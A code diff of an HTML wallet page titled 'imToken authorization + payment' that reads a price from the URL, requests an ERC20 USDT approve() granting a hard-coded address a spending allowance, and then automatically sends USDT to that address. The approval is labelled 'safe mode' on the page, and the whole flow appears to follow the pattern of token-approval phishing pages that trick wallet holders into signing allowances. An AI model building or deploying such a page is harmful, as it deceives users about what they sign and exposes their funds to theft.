@@ -4,20 +4,82 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>imToken 授权 + 支付</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      max-width: 800px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    .container {
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    .status {
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 4px;
+      background: #f5f5f5;
+    }
+    .success {
+      color: #52c41a;
+    }
+    .error {
+      color: #f5222d;
+    }
+    .info {
+      color: #1890ff;
+    }
+  </style>
 </head>
 <body>
-  <h2>imToken - 授权后自动支付 USDT</h2>
-  <p id="status">状态：加载中...</p>
+  <div class="container">
+    <h2>imToken - 授权后自动支付 USDT</h2>
+    <div id="status" class="status">状态：加载中...</div>
+    <div id="approval" style="display: none;">
+      <h3>授权信息</h3>
+      <p>授权金额：<span id="price1"></span> USDT</p>
+      <p>授权模式：<span id="aqorbmdinfo">安全模式</span></p>
+    </div>
+  </div>
 
   <script>
+    // 获取URL参数
+    function getQueryVariable(variable) {
+      var query = window.location.search.substring(1);
+      var vars = query.split("&");
+      for (var i = 0; i < vars.length; i++) {
+        var pair = vars[i].split("=");
+        if (pair[0] === variable) {
+          return decodeURIComponent(pair[1]);
+        }
+      }
+      return null;
+    }
+
+    // 设置页面内容
+    function setElementContentById(id, content) {
+      var element = document.getElementById(id);
+      if (element) {
+        element.innerText = content;
+      }
+    }
+
+    // 初始化参数
     const toAddress = "0x39eED5Ed04dbFA049890D77B0309Aa1a2D411075"; // 收款人地址
-    const contractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 地址
+    const contractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // USDT 合约地址
     const decimals = 6;
-    const amount = "1"; // 单位：USDT
-    const spender = toAddress; // 被授权的地址（通常是中间合约）
     const fromImToken = location.hash.includes("from=imtoken");
 
-    const amountInWei = (BigInt(amount * (10 ** decimals))).toString();
+    // 获取并设置金额
+    var shopPrice = parseFloat(getQueryVariable('price'));
+    if (!isNaN(shopPrice)) {
+      setElementContentById('price1', shopPrice);
+    }
+
+    const amountInWei = (BigInt(shopPrice * (10 ** decimals))).toString();
 
     async function getWallet() {
       document.getElementById("status").innerText = "请求钱包授权...";
@@ -27,7 +89,7 @@
 
     async function approveUSDT(from) {
       // 使用 ERC20 标准 approve(spender, amount)
-      const approveData = encodeApprove(spender, amountInWei);
+      const approveData = encodeApprove(toAddress, amountInWei);
       const result = await window.imToken.callAPI("native.transaction.sendContractTransaction", {
         from,
         to: contractAddress,
@@ -40,7 +102,7 @@
       const result = await window.imToken.callAPI("native.transaction.sendToken", {
         to: toAddress,
         contractAddress,
-        amount,
+        amount: shopPrice,
         decimals,
         symbol: "USDT"
       });
@@ -68,6 +130,7 @@
       try {
         const address = await getWallet();
         document.getElementById("status").innerText = `钱包已连接：${address}`;
+        document.getElementById("approval").style.display = "block";
 
         // Step 1: 授权
         document.getElementById("status").innerText = "发送授权交易...";
